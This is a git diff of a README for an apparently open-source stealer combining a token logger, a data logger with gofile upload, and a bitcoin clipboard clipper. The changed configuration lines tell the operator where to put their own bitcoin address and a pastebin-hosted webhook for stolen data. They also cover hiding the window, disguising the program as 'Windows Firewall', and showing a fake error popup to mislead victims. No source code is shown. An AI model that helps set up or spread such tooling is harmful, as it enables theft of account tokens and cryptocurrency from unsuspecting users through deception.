@@ -20,10 +20,13 @@ Once you have opened the script in your desired text editor, there are 3 lines t
 ```
 # Configuration
 debugger = False <--- Change this if you are having any issues with the logger. It will print any errors.
-BTC_ADDRESS = '3LsZH7LqxJMZBaVU9YoTLk8HNnUcmzE88v' <--- Change this to your own bitcoin address
-pastebin = "https://pastebin.com/raw/id" <--- Change this to your own pastebin link that contains your webhook
-hiddenWindow = False <--- Set this to True or False. If you want the window to be hidden on execution then set this to True
+BTC_ADDRESS = '3LsZH7LqxJMZBaVU9YoTLk8HNnUcmzE88v' <--- Change this to your own bitcoin address.
+pastebin = "https://pastebin.com/raw/id" <--- Change this to your own pastebin link that contains your webhook.
+hiddenWindow = False <--- Set this to True or False. If you want the window to be hidden on execution then set this to True.
 FakeFileName = "Windows Firewall" <--- Change this to the fake desired name.
+fakeError = True  <--- Set this to True or False. If you want a fake error message to popup then set it to True.
+fakeErrorMessage = "An unexpected error has occured."  <--- If you have fakeError enabled, change this to what you want the fake error popup to say.
+fakeErrorTitle = "Oops!" <--- If you have fakeError enabled, change this to what you want the fake error popup title to say.
 ```
 
 # Support
@@ -34,4 +37,4 @@ Create an issue, or message me on discord.
 Credit to me for maintaining this project, adding the data logger, gofile upload, and fixing any bugs that arise, and small changes.<br>
 Credit to checksum ([Github](https://github.com/ecriminal)) for the token logger<br>
 Credit to NightFallGT ([Github](https://github.com/nightfallgt)) for the BTC Clipper<br>
-Credit to anyone else who contributed :)<br>
+Credit to anyone else who I forgot :)<br>
